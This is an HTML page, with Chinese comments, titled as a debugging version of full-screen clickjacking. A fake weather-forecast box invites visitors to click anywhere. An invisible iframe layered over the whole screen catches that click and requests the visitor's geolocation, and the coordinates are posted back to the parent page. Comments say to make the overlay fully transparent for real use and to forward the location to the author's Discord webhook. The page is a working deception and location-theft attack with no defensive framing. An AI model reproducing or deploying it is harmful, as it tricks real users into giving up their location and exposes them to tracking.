<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>技術調試：全域點擊挾持</title>
<style>
    /* 誘餌層樣式 */
    body { font-family: Arial; text-align: center; padding-top: 100px; background: #4fc3f7; margin: 0; overflow: hidden; }
    .weather-box { 
        background: white; width: 300px; margin: auto; padding: 30px; 
        border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    }
    .btn-visual {
        padding: 15px 30px; font-size: 18px; border: none;
        border-radius: 12px; background: #1e88e5; color: white;
    }

    /* 核心：全螢幕挾持容器 */
    .cj-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        z-index: 9999; /* 確保在最最最上層 */
        cursor: pointer;
    }

    /* 隱形的 iframe */
    .hidden-iframe {
        width: 100%;
        height: 100%;
        border: none;
        /* 調試階段：設為 0.3 讓你看到它確實蓋住了全螢幕 */
        /* 正式使用時改為 0 */
        opacity: 0.3; 
        background: rgba(255, 0, 0, 0.1); 
    }
</style>
</head>
<body>

<!-- 使用者看到的漂亮畫面 -->
<div class="weather-box">
    <div style="font-size: 60px;">☀️</div>
    <h2>今日天氣預報</h2>
    <p>點擊螢幕任何地方獲取資料</p>
    <div class="btn-visual">查看天氣</div>
    <p id="status" style="margin-top:20px; color:red; font-weight:bold;"></p>
</div>

<!-- 覆蓋全螢幕的隱形陷阱 -->
<div class="cj-overlay">
    <iframe src="about:blank" id="target-frame" class="hidden-iframe"></iframe>
</div>

<script>
    const frame = document.getElementById('target-frame');
    const doc = frame.contentDocument || frame.contentWindow.document;
    
    // 注入一個「全網頁都是按鈕」的攻擊層
    doc.open();
    doc.write(`
        <body style="margin:0; padding:0;">
            <div onclick="ask()" style="width:100vw; height:100vh; background:transparent; cursor:pointer;"></div>
            <script>
                function ask() {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => { window.parent.postMessage({type:'success', lat:pos.coords.latitude, lon:pos.coords.longitude}, '*'); },
                        (err) => { window.parent.postMessage({type:'error'}, '*'); }
                    );
                }
            <\/script>
        </body>
    `);
    doc.close();

    // 接收來自隱形層的定位資料
    window.addEventListener('message', function(e) {
        if(e.data.type === 'success') {
            document.getElementById("status").innerHTML = "✅ 已定位：緯度 " + e.data.lat.toFixed(2);
            // 這裡可以接你原本的 Discord Webhook 傳輸邏輯
        } else if(e.data.type === 'error') {
            document.getElementById("status").innerHTML = "❌ 使用者拒絕提供位置";
        }
    });
</script>

</body>
</html>
